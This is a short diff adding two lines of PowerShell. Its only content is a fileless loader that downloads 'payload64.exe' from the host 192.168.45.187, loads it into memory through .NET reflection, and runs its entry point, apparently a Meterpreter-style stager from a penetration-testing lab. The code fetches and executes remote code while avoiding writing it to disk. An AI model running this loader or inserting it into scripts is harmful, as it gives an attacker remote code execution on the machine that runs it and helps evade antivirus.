@@ -1,0 +1,2 @@
+$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.187/payload64.exe'); $assem =
+[System.Reflection.Assembly]::Load($data);[simplemet.Program]::Main("".Split())
